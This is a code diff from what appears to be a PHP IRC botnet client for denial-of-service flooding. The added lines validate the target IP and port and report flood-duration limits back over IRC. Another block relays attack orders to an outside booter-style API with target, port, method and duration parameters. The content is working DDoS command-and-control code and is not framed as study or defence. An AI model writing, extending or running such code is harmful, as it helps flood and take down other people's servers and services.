@@ -108,9 +108,19 @@ while(is_resource($sock)){
 				fwrite($sock, "PRIVMSG $d[2] :Error: invalid method; $dos[0]\r\n");
 				$error++;
 			}
+			if(!filter_var($dos[1], FILTER_VALIDATE_IP)){
+				fwrite($sock, "PRIVMSG $d[2] :Error: invalid IP Address; $dos[1]\r\n");
+				$error++;
+			}
+			if($dos[2] > 65535 || $dos[2] < 1){
+				fwrite($sock, "PRIVMSG $d[2] :Error: invalid port; $dos[2]\r\n");
+				$error++;
+			}
 			if($dos[3] > $mt){
+				fwrite($sock, "PRIVMSG $d[2] :Error: $dos[3] exceeds the maximum flooding time of $mt; setting $mt as flooding time\r\n");
 				$dos[3] = $mt;
 			}elseif($dos[3] < 1){
+				fwrite($sock, "PRIVMSG $d[2] :Error: time is below 1, are you trying to make me flood forever?; setting 1 as flooding time\r\n");
 				$dos[3] = 1;
 			}
 			$time = time()+$dos[3];
@@ -177,8 +187,10 @@ while(is_resource($sock)){
 				$error++;
 			}
 			if($apidos[4] > $mt){
+				fwrite($sock, "PRIVMSG $d[2] :Error: $apidos[3] exceeds the maximum flooding time of $mt; setting $mt as flooding time\r\n");
 				$apidos[4] = $mt;
 			}elseif($apidos[4] < 1){
+				fwrite($sock, "PRIVMSG $d[2] :Error: time is below 1, are you trying to make me flood forever?; setting 1 as flooding time\r\n");
 				$apidos[4] = 1;
 			}
 			$attk = file_get_contents('http://'.$api_domain.'/api.php?key='.$apidos[0].'&t='.$apidos[2].'&p='.$apidos[3].'&m='.$apidos[1].'&ts='.$apidos[4]);
